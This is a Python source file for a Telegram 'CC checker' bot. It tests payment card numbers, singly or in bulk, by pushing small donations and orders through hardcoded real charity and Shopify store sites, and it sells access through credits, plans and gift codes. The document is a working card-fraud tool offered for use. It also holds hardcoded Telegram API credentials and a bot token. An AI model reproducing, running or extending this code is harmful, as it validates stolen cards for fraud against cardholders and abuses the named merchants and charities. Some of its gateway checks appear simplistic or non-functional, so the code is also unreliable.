import asyncio
import aiohttp
import re
import random
import time
import sqlite3
import os
import string
from datetime import datetime, timedelta
from urllib.parse import urljoin
from telethon import TelegramClient, events, Button

# ========== CONFIG ==========
API_ID = 37475384
API_HASH = 'b12b3d8b7585faa0841ea58c87f66a2c'
BOT_TOKEN = '8713354044:AAGntfEI4FoRfTs8Ng4--XeM6zvM5Hz0txs'
ADMIN_ID = [7409867517]   # Your admin ID

# Hardcoded sites (as per your request)
STRIPE_SITES = [
    "https://www.komitee.de/en/donate/donate-via-stripe/",
    "https://qgis.org/funding/donate/",
    "https://nnig.org/contribute",
    "https://waterwish.org",
    "https://givebutter.com",
]
SHOPIFY_SITES = [
    "https://allamericanroughneck.com",
    "https://thesill.com",
    "https://www.muji.us",
]
RAZORPAY_SITES = [
    "https://rzp.io/l/donate-test",
]

# Plan credits mapping
PLAN_CREDITS = {"CORE": 3000, "STANDARD": 10000, "ULTIMATE": 50000}

# ========== DATABASE ==========
DB_PATH = "multi_gate_bot.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        credits INTEGER DEFAULT 120,
        referral_code TEXT UNIQUE,
        plan TEXT DEFAULT 'FREE',
        expiry DATE DEFAULT NULL
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS gift_codes (
        code TEXT PRIMARY KEY,
        plan TEXT,
        days INTEGER,
        used INTEGER DEFAULT 0,
        created_at TEXT
    )''')
    conn.commit()
    conn.close()

def get_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT credits, referral_code, plan, expiry FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        credits, ref_code, plan, expiry_str = row
        if expiry_str and datetime.strptime(expiry_str, '%Y-%m-%d') < datetime.now():
            plan = "FREE"
            expiry_str = None
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("UPDATE users SET plan='FREE', expiry=NULL WHERE user_id=?", (user_id,))
            conn.commit()
            conn.close()
        return {'credits': credits, 'ref_code': ref_code, 'plan': plan, 'expiry': expiry_str}
    else:
        ref_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO users (user_id, credits, referral_code, plan, expiry) VALUES (?, 120, ?, 'FREE', NULL)",
                  (user_id, ref_code))
        conn.commit()
        conn.close()
        return {'credits': 120, 'ref_code': ref_code, 'plan': 'FREE', 'expiry': None}

def update_credits(user_id, delta):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (delta, user_id))
    conn.commit()
    conn.close()

def set_user_plan(user_id, plan, days):
    expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d') if days > 0 else None
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET plan=?, expiry=?, credits = credits + ? WHERE user_id=?",
              (plan, expiry, PLAN_CREDITS.get(plan.upper(), 0), user_id))
    conn.commit()
    conn.close()

def generate_gift_codes(plan, days, quantity):
    codes = []
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    for _ in range(quantity):
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        c.execute("INSERT INTO gift_codes (code, plan, days, created_at) VALUES (?, ?, ?, ?)",
                  (code, plan.upper(), days, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        codes.append(code)
    conn.commit()
    conn.close()
    return codes

def redeem_gift_code(code, user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT plan, days, used FROM gift_codes WHERE code=?", (code,))
    row = c.fetchone()
    if not row:
        conn.close()
        return False, "Invalid code"
    plan, days, used = row
    if used:
        conn.close()
        return False, "Code already used"
    c.execute("UPDATE gift_codes SET used=1 WHERE code=?", (code,))
    expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
    c.execute("UPDATE users SET plan=?, expiry=?, credits = credits + ? WHERE user_id=?",
              (plan, expiry, PLAN_CREDITS.get(plan, 0), user_id))
    conn.commit()
    conn.close()
    return True, f"Redeemed {plan} plan for {days} days! +{PLAN_CREDITS.get(plan, 0)} credits."

# ========== UTILITY FUNCTIONS ==========
def extract_cc(text):
    if not text:
        return []
    cards = []
    pattern = r'(\d{15,16})\s*[|/\\:]+\s*(\d{2})\s*[|/\\:]+\s*(\d{2,4})\s*[|/\\:]+\s*(\d{3,4})'
    for match in re.findall(pattern, text):
        c, m, y, cv = match
        if len(y) == 2:
            y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    return list(dict.fromkeys(cards))

async def get_bin_info(bin6):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://lookup.binlist.net/{bin6}', timeout=5) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    brand = data.get('scheme', '-').upper()
                    type_ = data.get('type', '-').upper()
                    bank = data.get('bank', {}).get('name', '-')
                    country = data.get('country', {}).get('name', '-')
                    flag = data.get('country', {}).get('emoji', '🏳️')
                    return f"{brand} {type_}", bank, f"{country} {flag}"
    except:
        pass
    return "-", "-", "Unknown"

# ========== GATE CHECK FUNCTIONS ==========
async def stripe_check(card, proxy=None):
    cc, mm, yy, cvv = card.split('|')
    if len(yy) == 2:
        yy = '20' + yy
    site = random.choice(STRIPE_SITES)
    async with aiohttp.ClientSession() as session:
        headers = {'User-Agent': 'Mozilla/5.0'}
        try:
            async with session.get(site, headers=headers, proxy=proxy) as resp:
                html = await resp.text()
            action_match = re.search(r'<form[^>]+action="([^"]+)"', html)
            action = action_match.group(1) if action_match else site
            data = {
                'amount': '1.00',
                'card_number': cc, 'expiry_month': mm, 'expiry_year': yy, 'cvv': cvv,
                'name': 'Test User', 'email': f'test{random.randint(1,999)}@example.com'
            }
            async with session.post(action, data=data, proxy=proxy, allow_redirects=True) as resp2:
                text = await resp2.text()
                if 'thank you' in text.lower() or 'success' in text.lower():
                    return "CHARGED ✅", "$1 donation succeeded"
                elif 'declined' in text.lower():
                    return "DECLINED ❌", "Card declined"
                else:
                    return "DECLINED ❌", "Failed"
        except:
            return "ERROR", "Site error"

async def shopify_check(card, proxy=None):
    cc, mm, yy, cvv = card.split('|')
    if len(yy) == 2:
        yy = '20' + yy
    site = random.choice(SHOPIFY_SITES)
    async with aiohttp.ClientSession() as session:
        try:
            cart_url = f"https://{site}/cart/add.js"
            payload = {"id": 41032415431, "quantity": 1}
            async with session.post(cart_url, json=payload, proxy=proxy) as resp:
                if resp.status not in [200, 302]:
                    return "ERROR", "Add to cart failed"
            async with session.get(f"https://{site}/cart", proxy=proxy) as resp2:
                html = await resp2.text()
                checkout_url = re.search(r'https://checkout\.shopify\.com/[^\s"\'<>]+', html)
                if not checkout_url:
                    return "ERROR", "No checkout URL"
            token_url = "https://deposit.us.shopifycs.com/sessions"
            token_payload = {"credit_card": {"number": cc, "month": int(mm), "year": int(yy), "verification_value": cvv}, "payment_session_scope": site}
            async with session.post(token_url, json=token_payload, proxy=proxy) as tok_resp:
                if tok_resp.status != 200:
                    return "DECLINED ❌", "Tokenization failed"
                tok_data = await tok_resp.json()
                session_id = tok_data.get('id')
            complete_url = checkout_url.group(0) + ".json"
            complete_payload = {"payment_session_id": session_id, "total_price": "100"}
            async with session.post(complete_url, json=complete_payload, proxy=proxy) as fin_resp:
                if fin_resp.status == 200:
                    return "CHARGED ✅", "Order placed"
                else:
                    return "DECLINED ❌", f"HTTP {fin_resp.status}"
        except Exception as e:
            return "ERROR", str(e)[:50]

async def razorpay_check(card, proxy=None):
    cc, mm, yy, cvv = card.split('|')
    if len(yy) == 2:
        yy = '20' + yy
    site = random.choice(RAZORPAY_SITES)
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(site, proxy=proxy) as resp:
                html = await resp.text()
            key_match = re.search(r'rzp_live_[a-zA-Z0-9]+', html)
            if not key_match:
                return "ERROR", "No RazorPay key"
            return "APPROVED ⚠️", "OTP required (RazorPay 3DS)"
        except:
            return "ERROR", "Site error"

# ========== TELEGRAM BOT ==========
client = TelegramClient('multi_gate_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Single check handler
async def single_check_handler(event, check_func, gate_name, cmd_prefix):
    uid = event.sender_id
    user = get_user(uid)
    if user['credits'] <= 0:
        await event.reply("❌ No credits left. Use /redeem or contact admin.")
        return
    card = event.raw_text.replace(cmd_prefix, '').strip().replace(' ', '')
    if '|' not in card:
        await event.reply(f"Usage: `{cmd_prefix} cc|mm|yy|cvv`")
        return
    update_credits(uid, -1)
    msg = await event.reply(f"🔄 Checking via {gate_name}...")
    start = time.time()
    status, resp = await check_func(card)
    elapsed = round(time.time() - start, 2)
    bin6 = card.split('|')[0][:6]
    bin_str, bank, country = await get_bin_info(bin6)
    result = f"{status}\nCard: `{card}`\nGateway: {gate_name}\nResponse: `{resp}`\nBIN: {bin_str}\nBank: {bank}\nCountry: {country}\nTook: {elapsed}s"
    await msg.edit(result, parse_mode='markdown')
    if "CHARGED" in status:
        update_credits(uid, 10)
        await event.reply("🎉 +10 credits bonus!")

# Mass check handler
async def mass_check_handler(event, check_func, gate_name, cmd_prefix):
    if not event.reply_to_msg_id:
        await event.reply(f"Reply to a .txt file with cards after `{cmd_prefix}`")
        return
    uid = event.sender_id
    user = get_user(uid)
    reply = await event.get_reply_message()
    if not reply.file:
        await event.reply("Reply to a file.")
        return
    path = await reply.download_media()
    try:
        with open(path, 'r') as f:
            lines = f.readlines()
        all_cards = []
        for line in lines:
            all_cards.extend(extract_cc(line))
        if not all_cards:
            await event.reply("No valid cards found.")
            return
        total = len(all_cards)
        if user['credits'] < total:
            await event.reply(f"Need {total} credits, you have {user['credits']}.")
            return
        update_credits(uid, -total)
        await event.reply(f"📥 Checking {total} cards via {gate_name}...")
        results = []
        for i, card in enumerate(all_cards[:500]):
            status, resp = await check_func(card)
            bin6 = card.split('|')[0][:6]
            bin_str, _, _ = await get_bin_info(bin6)
            results.append(f"{card} → {status} | {resp[:50]} | {bin_str}")
            if (i+1) % 20 == 0:
                await event.reply(f"Progress: {i+1}/{min(total,500)}")
        out_file = f"{gate_name.lower()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(out_file, 'w') as f:
            f.write("\n".join(results))
        await event.reply(file=out_file)
        os.remove(out_file)
    finally:
        if os.path.exists(path):
            os.remove(path)

# Gate commands
@client.on(events.NewMessage(pattern=r'^/st\s+'))
async def st_cmd(event): await single_check_handler(event, stripe_check, "Stripe Donation", '/st')
@client.on(events.NewMessage(pattern=r'^/sh\s+'))
async def sh_cmd(event): await single_check_handler(event, shopify_check, "Shopify", '/sh')
@client.on(events.NewMessage(pattern=r'^/rz\s+'))
async def rz_cmd(event): await single_check_handler(event, razorpay_check, "RazorPay", '/rz')

@client.on(events.NewMessage(pattern=r'^/mst$'))
async def mst_cmd(event): await mass_check_handler(event, stripe_check, "Stripe", '/mst')
@client.on(events.NewMessage(pattern=r'^/msh$'))
async def msh_cmd(event): await mass_check_handler(event, shopify_check, "Shopify", '/msh')
@client.on(events.NewMessage(pattern=r'^/mrz$'))
async def mrz_cmd(event): await mass_check_handler(event, razorpay_check, "RazorPay", '/mrz')

# Gift code generation (admin)
@client.on(events.NewMessage(pattern=r'^/gen\s+(\w+)\s+(\d+)\s+(\d+)$'))
async def gen_codes(event):
    if event.sender_id not in ADMIN_ID:
        await event.reply("❌ Admin only.")
        return
    plan = event.pattern_match.group(1).upper()
    days = int(event.pattern_match.group(2))
    qty = int(event.pattern_match.group(3))
    if plan not in ['CORE', 'STANDARD', 'ULTIMATE']:
        await event.reply("Invalid plan. Use CORE, STANDARD, or ULTIMATE.")
        return
    if days <= 0 or qty <= 0 or qty > 100:
        await event.reply("Days and quantity must be positive (max 100 codes).")
        return
    codes = generate_gift_codes(plan, days, qty)
    await event.reply(f"✅ Generated {qty} gift codes for {plan} ({days} days):\n" + "\n".join(codes))

# Redeem code
@client.on(events.NewMessage(pattern=r'^/redeem\s+(\w+)$'))
async def redeem_cmd(event):
    code = event.pattern_match.group(1).strip()
    uid = event.sender_id
    success, msg = redeem_gift_code(code, uid)
    await event.reply(f"{'✅' if success else '❌'} {msg}")

# Other commands
@client.on(events.NewMessage(pattern=r'^/info$'))
async def info_cmd(event):
    user = get_user(event.sender_id)
    expiry_str = user['expiry'] if user['expiry'] else "Never"
    await event.reply(
        f"👤 <b>Your Info</b>\n"
        f"Credits: {user['credits']}\n"
        f"Plan: {user['plan']}\n"
        f"Expiry: {expiry_str}\n"
        f"Referral: <code>{user['ref_code']}</code>",
        parse_mode='html'
    )

@client.on(events.NewMessage(pattern=r'^/referral$'))
async def referral_cmd(event):
    u = get_user(event.sender_id)
    me = await client.get_me()
    link = f"https://t.me/{me.username}?start=ref_{u['ref_code']}"
    await event.reply(f"🔗 Your referral link:\n{link}\n\n+100 credits per new user!")

@client.on(events.NewMessage(pattern=r'^/bin\s+(\d+)'))
async def bin_cmd(event):
    bin6 = event.pattern_match.group(1)[:6]
    bin_str, bank, country = await get_bin_info(bin6)
    await event.reply(f"🔎 <b>BIN: {bin6}</b>\n💳 {bin_str}\n🏦 {bank}\n🌍 {country}", parse_mode='html')

@client.on(events.NewMessage(pattern=r'^/addcredits\s+(\d+)\s+(\d+)$'))
async def addcredits(event):
    if event.sender_id not in ADMIN_ID:
        return
    uid = int(event.pattern_match.group(1))
    amt = int(event.pattern_match.group(2))
    update_credits(uid, amt)
    await event.reply(f"✅ Added {amt} credits to user {uid}")

@client.on(events.NewMessage(pattern='/start'))
async def start_cmd(event):
    uid = event.sender_id
    args = event.raw_text.split()
    if len(args) > 1 and args[1].startswith('ref_'):
        ref_code = args[1][4:]
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id FROM users WHERE referral_code=?", (ref_code,))
        ref_row = c.fetchone()
        conn.close()
        if ref_row and ref_row[0] != uid:
            update_credits(ref_row[0], 100)
            try:
                await client.send_message(ref_row[0], "🎉 New referral! +100 credits")
            except: pass
    user = get_user(uid)
    await event.reply(
        f"✅ <b>MULTI GATE CC CHECKER 🔥</b>\n\n"
        f"Credits: {user['credits']}\n"
        f"Plan: {user['plan']}\n"
        f"Expiry: {user['expiry'] or 'Never'}\n\n"
        f"<b>Commands:</b>\n"
        f"/st cc|mm|yy|cvv  → Stripe ($1)\n"
        f"/sh cc|mm|yy|cvv  → Shopify\n"
        f"/rz cc|mm|yy|cvv  → RazorPay\n"
        f"/mst, /msh, /mrz → Mass check (reply .txt)\n"
        f"/redeem CODE → Activate gift code\n"
        f"/bin 123456, /info, /referral\n"
        f"Admin: /gen PLAN DAYS QTY",
        parse_mode='html'
    )

async def main():
    init_db()
    print("✅ Bot started with gift codes! Admin ID:", ADMIN_ID)
    await client.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())